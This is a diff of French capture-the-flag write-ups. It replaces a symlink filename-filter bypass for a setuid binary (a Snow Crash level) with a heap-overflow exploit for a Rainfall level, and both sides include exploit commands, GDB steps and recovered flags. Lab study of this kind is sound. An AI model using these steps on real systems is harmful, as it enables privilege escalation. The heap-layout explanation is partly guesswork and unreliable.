@@ -1,90 +1,93 @@
-Voici ton texte complété :
+# Rainfall - Niveau 8
 
----
+## Objectif
 
-# Rapport de Vulnérabilité : Contournement de filtre par lien symbolique
+Exploiter une vulnérabilité de type heap overflow afin de manipuler la mémoire dynamique (tas) pour détourner l'exécution et récupérer le flag.
 
-## Description
+## Analyse détaillée de la vulnérabilité
 
-Dans ce niveau, un fichier `token` contient un flag mais est inaccessible directement via le programme `level08`. Le binaire exécutable `level08` fonctionne avec les droits de l’utilisateur `flag08` (grâce au **setuid**), ce qui signifie qu’il a les permissions pour executer le fichier `token`. Cependant, un filtrage sur le **nom du fichier** empêche un accès direct à `token`. En utilisant un **lien symbolique** pointant vers ce fichier sous un autre nom, il est possible de contourner ce filtre et de lire le contenu du fichier.
+Le programme permet trois commandes :
 
-## Comment Exploiter la Faille
+* `auth [argument]` : alloue dynamiquement `malloc(4)`.
+* `service [argument]` : utilise `strdup()` pour dupliquer une chaîne fournie par l'utilisateur, ce qui réalise une allocation dynamique en fonction de la taille de l'entrée.
+* `login` : vérifie des pointeurs internes pour éventuellement exécuter `system()`.
 
-### Étape 1 : Analyse des fichiers et des permissions
+La vulnérabilité provient du fait que les allocations dynamiques (`malloc`) réalisées pour la commande `auth` sont très petites (4 octets seulement). La commande `service`, elle, peut allouer un espace beaucoup plus grand avec `strdup()`.
 
-```bash
-ls -l
-```
+Lorsqu'une commande `service` reçoit une entrée suffisamment longue (28 caractères 'A'), elle déborde légèrement dans la mémoire adjacente, écrasant ainsi un pointeur voisin en mémoire (probablement celui alloué précédemment par `auth`).
 
-**Résultat :**
+## Stratégie d'attaque
 
-```
--rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
--rw-------  1 flag08 flag08    26 Mar  5  2016 token
-```
+1. Réaliser une petite allocation avec `auth` (pour réserver une mémoire contiguë sur le tas).
+2. Réaliser ensuite une grande allocation contrôlée avec `service`, provoquant un débordement précis pour écraser des pointeurs internes en mémoire.
+3. Déclencher la commande `login` pour vérifier les conditions en mémoire modifiées par le débordement et appeler la fonction `system()`.
 
-* Le fichier `level08` a le **bit SUID** et s’exécute avec les droits de `flag08`.
-* Le fichier `token` est lisible uniquement par `flag08`.
+## Exploit détaillé
 
-### Étape 2 : Exécution du programme avec le fichier bloqué
+### Commandes utilisées
 
 ```bash
-./level08 token
+./level8
+auth aaaa
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+login
 ```
 
-**Résultat :**
+### Pourquoi précisément 28 A ?
 
-```
-You may not access 'token'
-```
+Cette taille est cruciale :
 
-Le binaire refuse explicitement l’accès au fichier s’il s’appelle **token**.
+* Trop peu de 'A' ne permettrait pas d'écraser le pointeur visé.
+* Trop de 'A' provoquerait une corruption excessive et ferait échouer l'exploit.
 
-Le programme bloque visiblement l'accès en fonction du **nom** du fichier fourni, et non de son contenu ou de sa cible réelle.
+Exactement **28 caractères** permettent de parfaitement écraser le pointeur interne et le contrôler pour rediriger l'exécution vers la commande système désirée (`system`).
 
-### Étape 3 : Création d’un lien symbolique
+## Vérification avec GDB
 
-Créer un lien symbolique vers `token` avec un autre nom :
+Voici comment analyser l'exploit en détail avec GDB :
 
 ```bash
-ln -s ~/token /tmp/lien.txt
+gdb ./level8
 ```
 
-### Étape 4 : Exécution du binaire avec le lien symbolique
+### 1. Définir des breakpoints utiles :
 
-```bash
-./level08 /tmp/lien.txt
+```gdb
+(gdb) break malloc
+(gdb) break strdup
+(gdb) break free
+(gdb) break system
 ```
 
-**Résultat :**
+### 2. Lancer le programme dans GDB :
 
-```
-quif5eloekouj29ke0vouxean
-```
-
-Le flag est lu avec succès via le lien, car le programme n’a pas détecté le nom `token`.
-
----
-
-## Comment Résoudre la Faille
-
-Pour corriger cette vulnérabilité :
-
-* **Ne jamais filtrer uniquement sur le nom du fichier** : Cela peut facilement être contourné avec des liens symboliques ou des chemins alternatifs.
-* **Vérifier l'identité réelle du fichier** : Utiliser `realpath()`, `stat()` ou vérifier l'inode ou l’UID propriétaire.
-* **Limiter les chemins d'accès** : Restreindre les accès à un répertoire spécifique, sans autoriser les liens symboliques extérieurs.
-
-## Étape Finale
-
-On se connecte ensuite à l’utilisateur `flag08` en utilisant le mot de passe obtenu pour exécuter la commande suivante et obtenir le flag :
-
-```bash
-getflag
+```gdb
+(gdb) run
 ```
 
-**Flag récupéré** : `25749xKZ8L7DkSCwJkT9dyv6f`
+Entrer ensuite :
+
+```
+auth aaaa
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+login
+```
+
+### 3. Observer les allocations mémoire :
+
+```gdb
+(gdb) x/20x 0x804a008
+(gdb) x/20x 0x804a018
+```
+
+Vous pouvez observer clairement comment le débordement modifie les pointeurs internes en mémoire.
+
+## Résultat obtenu (flag)
+
+```
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
 ## Conclusion
 
-Cette vulnérabilité montre qu’un contrôle basé uniquement sur le nom d’un fichier est insuffisant. En créant un lien symbolique vers une ressource protégée, un attaquant peut facilement contourner cette restriction. Il est essentiel de **valider la cible réelle** des fichiers manipulés pour garantir la sécurité.
-
----
+Ce niveau illustre une attaque classique par heap overflow, mettant en avant les risques des allocations dynamiques et les débordements de mémoire non contrôlés. Une bonne compréhension des structures mémoires (`heap`) est essentielle pour exploiter précisément ce type de vulnérabilité.
